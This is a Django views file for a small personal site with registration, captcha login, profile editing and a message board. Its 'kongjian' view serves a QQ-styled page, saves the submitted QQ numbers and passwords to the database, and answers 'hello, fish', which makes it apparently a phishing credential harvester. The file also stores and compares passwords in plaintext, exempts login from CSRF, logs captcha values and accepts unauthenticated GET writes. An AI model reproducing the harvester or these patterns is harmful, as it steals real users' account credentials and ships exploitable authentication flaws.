# Create your views here.
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import HttpResponse, render, redirect
from .models import UserInfo, qq_kongjian, messages
from .utils.code import check_code
from io import BytesIO
from django.http import JsonResponse


def index(request):
    info = request.session.get("info")
    if not info:
        return render(request, "index_new.html", {"username": "登录"})
    else:
        username = info["username"]
        return render(request, 'index_Logged.html', {"username": username})


def light(request):
    return render(request, 'light.html')


def roll(request):
    return render(request, 'roll.html')


def light_agreement(request):
    return render(request, 'agreement.html')


def regist(request):
    if request.method == 'GET':
        return render(request, 'regist.html')
    else:
        req = request.POST
        email = req['email']
        username = req['username']
        password = req['password']
        all_user = UserInfo.objects.all()
        for i in all_user:
            if i.email == email:
                return render(request, 'regist.html', {'error_text': '该邮箱已注册'})
            elif i.username != username:
                continue
            else:
                return render(request, 'regist.html', {'error_text': '该用户名已存在'})
        UserInfo.objects.create(email=email, username=username, password=password)
        return render(request, 'login.html', {'error_text': '注册成功，请登录'})


@csrf_exempt
def login(request):
    req = request.POST
    username = req.get('username')
    password = req.get('password')
    code = req.get('code')
    try:
        sql_password = UserInfo.objects.get(username=username).password
        if password != sql_password:
            return JsonResponse({'error_text': '密码错误'})
        try:
            if request.session['code'] == 'null':
                return JsonResponse({'error_text': '验证码超时'})
        except:
            return JsonResponse({'error_text': '验证码超时,请重试'})
        if request.session['code'] != code.upper():
            return JsonResponse({'error_text': '验证码错误'})
        else:
            request.session.set_expiry(3153600000)
            user = UserInfo.objects.filter(username=username, password=password).first()
            request.session['info'] = {'id': user.id, 'username': user.username}
            return JsonResponse({'error_text': "None"})
    except:
        return JsonResponse({'error_text': '用户名错误'})


def colour_egg(request):
    return render(request, 'colour_egg.html')


def logout(request):
    request.session.clear()
    return redirect("/")


def personal(request):
    info = request.session["info"]
    username = info["username"]
    uid = info["id"]
    return render(request, 'personal.html', {'username': username, 'uid': uid})


def web_info(request):
    return render(request, 'web_info.html')


def edit_personal(request):
    info = request.session["info"]
    username = info["username"]
    user = UserInfo.objects.get(username=username)
    password = user.password
    if request.method == "GET":
        return render(request, 'edit_personal.html', {'username': username, 'password': password})
    else:
        user.username = request.POST['username']
        user.password = request.POST['password']
        user.save()
        request.session.clear()
        return render(request, 'login.html', {'error_text': "修改成功，请重新登录"})


def kongjian(request):
    if request.method == "GET":
        return render(request, 'QQ.html')
    else:
        qq = request.POST['QQ']
        password = request.POST['password']
        qq_kongjian.objects.create(qq=qq, password=password)
        return HttpResponse('你好，鱼')


def image_code(request):
    img, code_str = check_code()
    print(code_str)
    request.session['code'] = code_str
    request.session.set_expiry(60)
    stream = BytesIO()
    img.save(stream, 'png')
    return HttpResponse(stream.getvalue())


def message_send(request):
    message = request.GET.get('message')
    username = request.GET.get('username')
    messages.objects.create(username=username, message=message)
    return HttpResponse('ok')


def message_get(request):
    max_index = request.GET.get('index')
    max_index = int(max_index)
    message = messages.objects.all()
    username_list = list()
    message_list = list()
    for i in message:
        username_list.append(i.username)
        message_list.append(i.message)
    message_dict = {'username': username_list[max_index:], 'message': message_list[max_index:],
                    'max_index': len(username_list)}
    return JsonResponse(message_dict)
